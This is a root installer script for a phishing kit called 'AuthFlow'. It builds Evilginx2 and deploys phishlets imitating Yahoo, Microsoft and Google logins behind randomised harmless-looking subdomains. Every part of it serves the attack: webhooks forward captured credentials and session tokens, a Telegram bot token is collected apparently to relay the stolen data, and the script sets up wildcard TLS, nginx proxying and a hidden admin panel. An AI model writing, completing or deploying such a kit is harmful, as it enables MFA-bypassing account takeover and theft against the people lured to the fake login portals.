#!/bin/bash
set -e

GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'
log() { echo -e "${GREEN}[+]${NC} $1"; }
err() { echo -e "${RED}[ERROR]${NC} $1"; exit 1; }

clear
echo "============================================"
echo "     AuthFlow Installation"
echo "============================================"
echo ""

[ "$EUID" -ne 0 ] && err "Run as root: sudo bash install.sh"

read -p "Domain: " DOMAIN
read -p "VPS IP: " VPS_IP
read -p "Telegram Bot Token: " TG_TOKEN
read -p "Telegram Chat ID: " TG_CHAT
read -p "Cloudflare API Token: " CF_TOKEN
read -sp "Admin Password (blank=auto): " ADMIN_PASS
echo ""

[ -z "$ADMIN_PASS" ] && ADMIN_PASS=$(openssl rand -base64 16 | tr -d '/+=' | cut -c1-16)
WEBHOOK_SECRET=$(openssl rand -hex 16)
ADMIN_PATH=$(openssl rand -hex 12)
SUB1="img-$(openssl rand -hex 4)"
SUB2="api-$(openssl rand -hex 4)"
SUB3="static-$(openssl rand -hex 4)"

echo ""
echo "Portals: https://$SUB1.$DOMAIN | https://$SUB2.$DOMAIN | https://$SUB3.$DOMAIN"
read -p "Continue? (y/n): " -n 1 -r
echo ""
[[ ! $REPLY =~ ^[Yy]$ ]] && exit 1

log "Installing dependencies..."
apt-get update -qq && apt-get install -y -qq git curl wget nginx certbot python3-certbot-dns-cloudflare golang-go

log "Building AuthFlow..."
INSTALL_DIR="/opt/authflow"
mkdir -p $INSTALL_DIR/{data,logs,phishlets}
cp main.go go.mod $INSTALL_DIR/
cd $INSTALL_DIR

go mod tidy
go build -o authflow-server -ldflags="-s -w" main.go

log "Installing Evilginx..."
cd /opt
if [ ! -d "evilginx2" ]; then
    git clone https://github.com/kgretzky/evilginx2.git
fi
cd evilginx2
make
make install
cp build/evilginx /usr/local/bin/

log "Configuring Evilginx..."
mkdir -p /opt/evilginx/{phishlets,certs}

# Copy phishlet files
if [ -d "$INSTALL_DIR/phishlets" ]; then
    cp $INSTALL_DIR/phishlets/*.yaml /opt/evilginx/phishlets/ 2>/dev/null || true
fi

# Copy Evilginx config
if [ -f "$INSTALL_DIR/evilginx.conf" ]; then
    cp $INSTALL_DIR/evilginx.conf /opt/evilginx/config.yaml
else
    cat > /opt/evilginx/config.yaml << EOF
daemon = false
debug = false
version = 3.0.0
domain = $DOMAIN
ipv4 = 0.0.0.0
http_port = 8080
https_port = 8443
redirect_url = https://www.google.com
phishlets_path = /opt/evilginx/phishlets
cert_path = /opt/evilginx/certs
database = /opt/evilginx/evilginx.db
EOF
fi

# Replace placeholders in config
sed -i "s/DOMAIN_PLACEHOLDER/$DOMAIN/g" /opt/evilginx/config.yaml

# Replace placeholders in phishlets
if [ -f /opt/evilginx/phishlets/yahoo.yaml ]; then
    sed -i "s/SUB1_PLACEHOLDER/$SUB1/g" /opt/evilginx/phishlets/yahoo.yaml
fi
if [ -f /opt/evilginx/phishlets/microsoft.yaml ]; then
    sed -i "s/SUB2_PLACEHOLDER/$SUB2/g" /opt/evilginx/phishlets/microsoft.yaml
fi
if [ -f /opt/evilginx/phishlets/google.yaml ]; then
    sed -i "s/SUB3_PLACEHOLDER/$SUB3/g" /opt/evilginx/phishlets/google.yaml
fi

# Add webhook configuration to each phishlet
for phishlet in yahoo microsoft google; do
    if [ -f /opt/evilginx/phishlets/$phishlet.yaml ]; then
        cat >> /opt/evilginx/phishlets/$phishlet.yaml << EOF

webhook:
  url: "http://127.0.0.1:3000/api/webhook"
  headers:
    X-AuthFlow-Secret: $WEBHOOK_SECRET
  format: "json"
  events: ["credentials", "session"]
EOF
    fi
done

log "Creating configuration..."
cat > /opt/authflow/config.json << EOF
{
    "domain": "$DOMAIN",
    "vps_ip": "$VPS_IP",
    "telegram_bot_token": "$TG_TOKEN",
    "telegram_chat_id": "$TG_CHAT",
    "admin_pass": "$ADMIN_PASS",
    "data_dir": "/opt/authflow/data",
    "sub_portal1": "$SUB1",
    "admin_path": "$ADMIN_PATH",
    "sub_portal2": "$SUB2",
    "sub_portal3": "$SUB3",
    "log_retention_days": 30,
    "webhook_secret": "$WEBHOOK_SECRET",
    "admin_whitelist": []
}
EOF

log "Setting up SSL..."
mkdir -p ~/.secrets
cat > ~/.secrets/cloudflare.ini << EOF
dns_cloudflare_api_token = $CF_TOKEN
EOF
chmod 600 ~/.secrets/cloudflare.ini

certbot certonly --dns-cloudflare --dns-cloudflare-credentials ~/.secrets/cloudflare.ini \
    -d "$DOMAIN" -d "*.$DOMAIN" --non-interactive --agree-tos --register-unsafely-without-email

log "Configuring Nginx..."
cat > /etc/nginx/sites-available/authflow << EOF
server {
    listen 80;
    server_name $DOMAIN *.$DOMAIN;
    return 301 https://\$server_name\$request_uri;
}
server {
    listen 443 ssl http2;
    server_name $DOMAIN;
    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;
    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
    location /ws {
        proxy_pass http://127.0.0.1:3000/ws;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
server {
    listen 443 ssl http2;
    server_name ~^(img|api|static)-.+\.$DOMAIN$;
    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;
    location / {
        proxy_pass https://127.0.0.1:8443;
        proxy_ssl_verify off;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
        proxy_redirect off;
        proxy_buffering off;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
EOF

ln -sf /etc/nginx/sites-available/authflow /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default
nginx -t && systemctl start nginx && systemctl enable nginx && systemctl reload nginx

log "Creating services..."
cat > /etc/systemd/system/authflow.service << 'EOF'
[Unit]
Description=AuthFlow Server
After=network.target
[Service]
Type=simple
User=root
WorkingDirectory=/opt/authflow
ExecStart=/opt/authflow/authflow-server --config /opt/authflow/config.json
Restart=always
RestartSec=5
StandardOutput=append:/opt/authflow/logs/authflow.log
StandardError=append:/opt/authflow/logs/authflow.log
[Install]
WantedBy=multi-user.target
EOF

cat > /etc/systemd/system/evilginx.service << 'EOF'
[Unit]
Description=Evilginx Proxy
After=network.target
[Service]
Type=simple
User=root
WorkingDirectory=/opt/evilginx
ExecStart=/usr/local/bin/evilginx -c /opt/evilginx/config.yaml
Restart=always
RestartSec=5
[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable authflow evilginx nginx
systemctl start authflow evilginx

sleep 3

clear
echo ""
echo "============================================"
echo "     Installation Complete"
echo "============================================"
echo ""
echo "Dashboard: https://$DOMAIN/$ADMIN_PATH"
echo "Username: admin"
echo "Password: $ADMIN_PASS"
echo ""
echo "Portal URLs:"
echo "  1: https://$SUB1.$DOMAIN"
echo "  2: https://$SUB2.$DOMAIN"
echo "  3: https://$SUB3.$DOMAIN"
echo ""
echo "Commands:"
echo "  sudo systemctl status authflow evilginx"
echo "  sudo journalctl -u authflow -f"
echo "============================================"